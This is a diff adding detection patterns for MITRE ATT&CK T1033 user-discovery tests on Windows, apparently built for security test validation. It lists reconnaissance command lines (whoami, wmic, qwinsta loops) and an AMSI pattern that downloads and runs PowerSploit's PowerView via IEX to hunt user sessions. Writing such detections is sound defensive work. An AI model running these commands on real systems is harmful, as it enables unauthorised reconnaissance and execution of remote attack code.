@@ -1,0 +1,37 @@
+T1033,windows,4c4959bf,System Owner/User Discovery
+FYI, Test fails as it requires remote computer
+ARG,computer_name,localhost
+_E_,Process,cmdline~=cmd.exe /C whoami
+_E_,Process,cmdline~=wmic useraccount get /ALL
+_E_,Process,cmdline~=quser /SERVER:"#{computer_name}"
+_E_,Process,cmdline~=quser
+_E_,Process,cmdline~=qwinsta.exe /server:#{computer_name}
+_E_,Process,cmdline~=qwinsta.exe
+_E_,Process,cmdline~=for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
+_E_,Process,cmdline~=@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
+
+T1033,windows,29857f27,Find computers where user has session - Stealth mode (PowerView)
+FYI, Test fails as there is no Active Directory Domain
+_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+_E_,AMSI,scan_content~=IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
+
+T1033,windows,dcb6cdee,User Discovery With Env Vars PowerShell Script
+_E_,AMSI,scan_content~=[System.Environment]::UserName 
+_E_,AMSI,scan_content~=$env:UserName
+
+T1033,windows,1392bd0f,GetCurrent User with PowerShell Script
+_E_,AMSI,scan_content~=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+T1033,windows,3d257a03,System Discovery - SocGholish whoami
+ARG,output_path,$env:temp
+_E_,AMSI,scan_content~=whoami.exe /all
+
+T1033,windows,ba38e193,System Owner/User Discovery Using Command Prompt
+FYI, Test fails as "net users" command throws an error
+ARG,output_file_path,$env:temp
+_E_,Process,cmdline~=set file=#{output_file_path}\user_info_%random%.tmp
+_E_,Process,cmdline~=echo Username: %USERNAME% > %file%
+_E_,Process,cmdline~=echo User Domain: %USERDOMAIN% >> %file%
+_E_,Process,cmdline~=net users >> %file%
+_E_,Process,cmdline~=query user >> %file%
+
